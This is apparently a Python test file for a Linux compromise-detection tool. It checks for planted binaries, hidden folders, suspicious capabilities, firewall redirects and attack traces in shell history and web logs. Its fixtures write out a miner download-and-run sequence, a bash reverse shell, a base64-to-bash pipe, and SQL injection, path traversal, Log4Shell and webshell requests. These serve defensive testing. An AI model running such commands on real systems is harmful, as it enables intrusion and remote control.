"""2-D 파일·명령 기록·설정: FS-01·03·07·08·09, CMD-01·02·03, NET-03·04·05, 수집기 filewalk·history, 2-C 표시 개선."""
import os
import struct
import unittest

from helpers import FakeRootTest, files_owned_by_root

from lintrace.checks.base import Context
from lintrace.checks.cmd_01 import Cmd01, downloaded_name, runs
from lintrace.checks.cmd_02 import Cmd02
from lintrace.checks.cmd_03 import Cmd03
from lintrace.checks.fs_01 import Fs01
from lintrace.checks.fs_03 import Fs03, decode
from lintrace.checks.fs_07 import Fs07
from lintrace.checks.fs_08 import Fs08
from lintrace.checks.fs_09 import Fs09, IMMUTABLE
from lintrace.checks.net_03 import Net03
from lintrace.checks.net_04 import Net04
from lintrace.checks.net_05 import Net05
from lintrace.checks.per_08 import Per08
from lintrace.collectors.filewalk import Walk
from lintrace.collectors.history import history, parse

from test_per_2c import dpkg

NOW = 1_762_400_000
PASSWD = ("root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
          "test:x:1000:1000::/home/test:/bin/bash\n")
ELF_EXEC = b"\x7fELF\x02\x01\x01" + b"\0" * 9 + struct.pack("<H", 2) + b"\0" * 40
ELF_DYN = b"\x7fELF\x02\x01\x01" + b"\0" * 9 + struct.pack("<H", 3) + b"\0" * 40


def cap(*bits, effective=True):
    p = 0
    for b in bits:
        p |= 1 << b
    return struct.pack("<IIIII", 0x02000000 | (1 if effective else 0), p & 0xFFFFFFFF, 0, p >> 32, 0)


class Base(FakeRootTest):
    def run_check(self, check, files, setup=None, walk=None):
        files = dict(files)
        files.setdefault("/etc/passwd", PASSWD)
        root = self.make_root(files)
        if setup:
            setup(root)
        ctx = Context(root, now=NOW)
        if walk is not None:
            ctx._filewalk = walk
        f = check.run(ctx)
        return check, f, ctx


def stat_of(root, path):
    return os.lstat(os.path.join(root, path.lstrip("/")))


class TestFs01(Base):
    def test_temp_elf(self):
        c, f, _ = self.run_check(Fs01(), {"/tmp/.x/miner": ELF_EXEC, "/var/tmp/libh.so": ELF_DYN,
                                          "/tmp/notes.txt": "hello", "/var/tmp/short": "\x7fE"})
        self.assertEqual(sorted(x.severity for x in f), ["critical", "warning"])
        crit = [x for x in f if x.severity == "critical"][0]
        self.assertIn("/tmp/.x/miner", crit.reason)
        self.assertIn("숨김 경로", crit.reason)
        self.assertIn("공유 라이브러리", [x for x in f if x.severity == "warning"][0].reason)
        self.assertIn("ELF 2개", c.scope)


class TestFs03(Base):
    def test_decode(self):
        self.assertEqual(decode(cap(13))[1], "cap_net_raw+ep")
        names, text = decode(cap(7, 21, effective=False))
        self.assertEqual(names, ["setuid", "sys_admin"])
        self.assertEqual(text, "cap_setuid,cap_sys_admin+p")
        self.assertEqual(decode(cap(40))[0], ["checkpoint_restore"])  # 높은 32비트

    def test_judgement(self):
        files = dpkg({"iputils-ping": {"/usr/bin/ping": "PING"}, "python3.12": {"/usr/bin/python3.12": "PY"},
                      "snapd": {"/usr/lib/snapd/snap-confine": "SC"}})
        files.update({"/usr/bin/ping": "PING", "/usr/bin/python3.12": "PY", "/usr/lib/snapd/snap-confine": "SC",
                      "/opt/tool/scan": "X"})

        def walk(root):
            w = Walk()
            w.files_seen = 4
            w.caps = [("/usr/bin/ping", None, cap(13)), ("/usr/bin/python3.12", None, cap(7)),
                      ("/usr/lib/snapd/snap-confine", None, cap(0, 1, 2, 3, 6, 7, 19, 21)),
                      ("/opt/tool/scan", None, cap(13))]
            return w
        files.setdefault("/etc/passwd", PASSWD)
        root = self.make_root(files)
        ctx = Context(root, now=NOW)
        ctx._filewalk = walk(root)
        c = Fs03()
        f = c.run(ctx)
        self.assertEqual(sorted(x.severity for x in f), ["critical", "warning"])
        crit = [x for x in f if x.severity == "critical"][0]
        self.assertIn("/usr/bin/python3.12", crit.reason)
        self.assertIn("setuid", crit.reason)
        self.assertIn("/opt/tool/scan", [x for x in f if x.severity == "warning"][0].reason)
        self.assertIn("패키지 원본 2개: ping, snap-confine", c.scope)


class TestFs07(Base):
    @files_owned_by_root
    def test_mixed_ownership(self):
        files = {"/var/www/site/index.php": "<?php echo 1;", "/var/www/site/lib/a.php": "<?php",
                 "/var/www/site/up/x.php": "<?php"}
        c, f, _ = self.run_check(Fs07(), files,
                                 lambda r: os.chown(os.path.join(r, "var/www/site/up/x.php"), 33, 33))
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "warning")
        self.assertIn("/var/www/site/up/x.php", f[0].reason)
        self.assertIn("www-data", f[0].reason)

    @files_owned_by_root
    def test_all_owned_by_web(self):
        files = {"/var/www/wordpress/wp-includes/{}.php".format(i): "<?php" for i in range(5)}
        def chown_all(r):
            for i in range(5):
                os.chown(os.path.join(r, "var/www/wordpress/wp-includes/{}.php".format(i)), 33, 33)
        c, f, _ = self.run_check(Fs07(), files, chown_all)
        self.assertEqual([x.severity for x in f], ["info"])
        self.assertIn("스크립트 5개 중 5개(100%)가 웹 서버 계정(www-data) 소유", f[0].reason)


class TestFs08(Base):
    def test_hidden(self):
        files = dpkg({"linux-image": {"/lib/modules/6.8/vdso/.build-id/x": "b"}})
        paths = ["/usr/lib/.lib/k", "/tmp/.../m", "/dev/shm/.x/a", "/tmp/.X11-unix/X0", "/home/test/.cache/a",
                 "/opt/app/node_modules/.bin/x", "/lib/modules/6.8/vdso/.build-id/x", "/usr/lib/.lib/.inner/z"]
        for p in paths:
            files[p] = "x"
        files["/var/lib/dpkg/info/linux-image.list"] += "/lib/modules/6.8/vdso/.build-id\n"
        files["/etc/passwd"] = PASSWD

        def walk():
            w = Walk()
            w.hidden = [(d, os.lstat(os.path.join(root, d.lstrip("/")))) for d in sorted(
                {"/usr/lib/.lib", "/tmp/...", "/dev/shm/.x", "/tmp/.X11-unix", "/home/test/.cache",
                 "/opt/app/node_modules/.bin", "/lib/modules/6.8/vdso/.build-id", "/usr/lib/.lib/.inner"})]
            return w
        root = self.make_root(files)
        ctx = Context(root, now=NOW)
        ctx._filewalk = walk()
        c = Fs08()
        f = c.run(ctx)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("숨김 폴더 3개", f[0].reason)
        for p in ("/tmp/...", "/dev/shm/.x", "/usr/lib/.lib"):
            self.assertIn(p, f[0].reason)
        self.assertNotIn(".inner", f[0].reason)  # 이미 낸 폴더 안쪽
        self.assertIn("정상 3개", c.scope)


class FakeFlags(Fs09):
    marks = {}

    def flags(self, ctx, path):
        return self.marks.get(path, 0)


class TestFs09(Base):
    def test_immutable(self):
        FakeFlags.marks = {"/home/test/.ssh/authorized_keys": IMMUTABLE, "/etc/hostname": IMMUTABLE}
        c, f, _ = self.run_check(FakeFlags(), {"/home/test/.ssh/authorized_keys": "ssh-ed25519 AAAA",
                                               "/etc/hostname": "web01\n", "/etc/hosts": "x"})
        self.assertEqual(sorted(x.severity for x in f), ["critical", "warning"])
        crit = [x for x in f if x.severity == "critical"][0]
        self.assertIn("authorized_keys", crit.reason)


class TestHistory(Base):
    def test_parse_formats(self):
        bash = parse(["#1762390000", "wget http://x/a", "ls"], "u", "/home/u/.bash_history")
        self.assertEqual([(e.ts, e.cmd) for e in bash], [(1762390000, "wget http://x/a"), (None, "ls")])
        zsh = parse([": 1762390001:0;curl x | sh"], "u", "/home/u/.zsh_history")
        self.assertEqual((zsh[0].ts, zsh[0].cmd), (1762390001, "curl x | sh"))
        fish = parse(["- cmd: id", "  when: 1762390002"], "u", "/home/u/.local/share/fish/fish_history")
        self.assertEqual((fish[0].ts, fish[0].cmd), (1762390002, "id"))

    def test_download_helpers(self):
        self.assertEqual(downloaded_name("wget http://1.2.3.4/x/kinsing"), ["kinsing"])
        self.assertEqual(downloaded_name("curl -s http://h/a.sh -o /tmp/.a"), ["/tmp/.a"])
        self.assertEqual(runs("chmod +x kinsing", "kinsing"), "실행 권한 부여")
        self.assertEqual(runs("cd /tmp; ./kinsing &", "kinsing"), "실행")
        self.assertEqual(runs("bash /tmp/.a", "/tmp/.a"), "bash로 실행")
        self.assertIsNone(runs("cat kinsing.txt", "kinsing"))


class TestCmd(Base):
    HIST = ("#1762390000\ncd /tmp\nwget http://45.9.1.2/kinsing\nchmod +x kinsing\n./kinsing &\n"
            "curl -fsSL https://get.docker.com | sh\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n"
            "echo Y3VybCB4fHNo | base64 -d | bash\nwget https://example.com/report.pdf\n")

    def test_cmd01(self):
        c, f, _ = self.run_check(Cmd01(), {"/root/.bash_history": self.HIST})
        self.assertEqual(len(f), 1)
        r = f[0].reason
        self.assertIn("내려받은 파일 kinsing를 실행했다", r)
        self.assertIn("내려받아 바로 실행했다", r)
        self.assertNotIn("report.pdf", r)
        details = [e.detail for e in f[0].evidence]
        self.assertTrue(any(d.startswith("5행 (실행") for d in details), details)
        self.assertIn("명령 기록 파일 1개", c.scope)

    def test_cmd02_and_service_account(self):
        c, f, _ = self.run_check(Cmd02(), {"/root/.bash_history": self.HIST, "/var/www/.bash_history": "id\nls -la\n"})
        self.assertEqual(sorted(x.severity for x in f), ["critical", "warning"])
        crit = [x for x in f if x.severity == "critical"][0]
        self.assertIn("리버스 셸", crit.reason)
        self.assertIn("인코딩된 내용을 풀어 실행", crit.reason)
        warn = [x for x in f if x.severity == "warning"][0]
        self.assertIn("서비스 계정 'www-data'에 명령 2개", warn.reason)


LOG = """192.168.16.18 - - [03/Nov/2026:02:01:54 +0000] "GET /wp-includes/js/imgareaselect/imgareaselect.css?ver=0.9.8 HTTP/1.1" 200 790 "http://192.168.16.69/wp-admin/post-new.php" "Mozilla/5.0"
10.0.0.9 - - [06/Nov/2026:03:00:01 +0000] "GET /?id=1%27%20UNION%20SELECT%201,2,user()--%20 HTTP/1.1" 200 512 "-" "sqlmap/1.8"
10.0.0.9 - - [06/Nov/2026:03:00:02 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 100 "-" "curl/8"
10.0.0.9 - - [06/Nov/2026:03:00:03 +0000] "GET /wp-content/uploads/2026/11/s.php?c=id HTTP/1.1" 200 33 "-" "curl/8"
10.0.0.7 - - [06/Nov/2026:03:00:04 +0000] "GET /?x=${jndi:ldap://e/a} HTTP/1.1" 404 10 "-" "Mozilla"
"""


class TestCmd03(Base):
    def test_patterns_and_webshell(self):
        files = {"/var/log/nginx/access.log": LOG, "/var/www/wordpress/wp-content/uploads/2026/11/s.php": "<?php"}
        root = self.make_root(dict(files, **{"/etc/passwd": PASSWD}))
        ctx = Context(root, now=NOW)
        ctx._fs06_paths = {"/var/www/wordpress/wp-content/uploads/2026/11/s.php"}
        c = Cmd03()
        f = c.run(ctx)
        kinds = [x.reason.split(" 시도")[0].replace("웹 접근 로그에 ", "") for x in f if x.severity == "warning"]
        self.assertEqual(kinds, ["SQL 인젝션", "경로 조작", "Log4Shell", "스캐너 도구"])
        crit = [x for x in f if x.severity == "critical"]
        self.assertEqual(len(crit), 1)
        self.assertIn("s.php에 대한 요청이 1건 성공했다 — 출발 IP 10.0.0.9", crit[0].reason)
        self.assertIn("웹 로그 1개, 5줄", c.scope)

    def test_clean_wordpress_log(self):
        c, f, _ = self.run_check(Cmd03(), {"/var/log/nginx/access.log": LOG.splitlines()[0] + "\n"})
        self.assertEqual(f, [])


class TestNet(Base):
    def test_hosts(self):
        hosts = ("127.0.0.1 localhost\n127.0.1.1 test\n::1 ip6-localhost ip6-loopback\n"
                 "10.0.0.66 archive.ubuntu.com security.ubuntu.com\n10.1.1.5 db01\n")
        c, f, _ = self.run_check(Net03(), {"/etc/hosts": hosts, "/etc/hostname": "test\n"})
        self.assertEqual([x.severity for x in f], ["warning", "info"])
        self.assertIn("archive.ubuntu.com, security.ubuntu.com → 10.0.0.66", f[0].reason)
        self.assertIn("db01 → 10.1.1.5", f[1].reason)
        c, f, _ = self.run_check(Net03(), {"/etc/hosts": "127.0.0.1 localhost.localdomain localhost\n"
                                                         "::1 localhost6.localdomain6 localhost6\nff02::1 ip6-allnodes\n"})
        self.assertEqual(f, [])

    def test_resolv(self):
        stub = {"/run/systemd/resolve/stub-resolv.conf": "nameserver 127.0.0.53\n"}

        def link(root):
            os.symlink("../run/systemd/resolve/stub-resolv.conf", os.path.join(root, "etc/resolv.conf"))
        c, f, _ = self.run_check(Net04(), dict(stub, **{"/etc/systemd/resolved.conf": "[Resolve]\n"}), link)
        self.assertEqual(f, [])
        c, f, _ = self.run_check(Net04(), {"/etc/resolv.conf": "nameserver 203.0.113.53\n",
                                           "/etc/netplan/50.yaml": "nameservers:\n  addresses: [8.8.8.8]\n"})
        self.assertEqual(len(f), 1)
        self.assertIn("203.0.113.53", f[0].reason)
        c, f, _ = self.run_check(Net04(), {"/etc/resolv.conf": "nameserver 8.8.8.8\n",
                                           "/etc/netplan/50.yaml": "nameservers:\n  addresses: [8.8.8.8]\n",
                                           "/etc/systemd/resolved.conf.d/x.conf": "[Resolve]\nDNS=198.51.100.1\n"})
        self.assertEqual(len(f), 1)
        self.assertIn("설정 파일에서 직접", f[0].reason)

    def test_firewall(self):
        docker = ("*nat\n:DOCKER - [0:0]\n-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER\n"
                  "-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE\n-A DOCKER -i docker0 -j RETURN\nCOMMIT\n"
                  "*filter\n-A FORWARD -o docker0 -j DOCKER\n-A DOCKER-ISOLATION-STAGE-1 -j RETURN\nCOMMIT\n")

        class Live(Net05):
            rules = {}

            def live_rules(self, ctx):
                return self.rules
        Live.rules = {"iptables-save": docker}
        c, f, _ = self.run_check(Live(), {})
        self.assertEqual(f, [])
        Live.rules = {"iptables-save": docker + "*nat\n-A PREROUTING -s 6.6.6.6/32 -p tcp --dport 80 -j REDIRECT "
                                                "--to-ports 22\nCOMMIT\n",
                      "nft list ruleset": "table ip t {\n chain c {\n  tcp dport 8080 dnat to 10.0.0.2:22\n }\n}\n"}
        c, f, _ = self.run_check(Live(), {"/etc/iptables/rules.v4": "-A INPUT -m string --string 'knock' --algo bm -j ACCEPT\n"})
        self.assertEqual(len(f), 1)
        self.assertIn("REDIRECT", f[0].reason)
        for what in ("REDIRECT", "DNAT", "string 매치"):
            self.assertIn(what, f[0].reason)


class TestPer08Display(Base):
    @files_owned_by_root
    def test_operator_and_no_duplicate(self):
        files = dpkg({"udev": {"/lib/udev/rules.d/50-x.rules": "x"}})
        files["/etc/udev/rules.d/99-x.rules"] = 'ACTION=="add", RUN+="/var/tmp/.u"\n'
        c, f, _ = self.run_check(Per08(), files)
        self.assertIn('1행: RUN+="/var/tmp/.u"', [e.detail for e in f[0].evidence])
        self.assertEqual(f[0].reason.count("임시 폴더"), 1)


class TestHistoryCollector(Base):
    def test_files(self):
        _, _, ctx = self.run_check(Cmd02(), {"/home/test/.bash_history": "ls\n", "/var/www/.bash_history": "id\n"})
        h = history(ctx)
        self.assertEqual(sorted((u, n) for u, _, n, _ in h.files), [("test", 1), ("www-data", 1)])
        self.assertEqual({u: s for u, _, _, s in h.files}, {"test": False, "www-data": True})


if __name__ == "__main__":
    unittest.main()
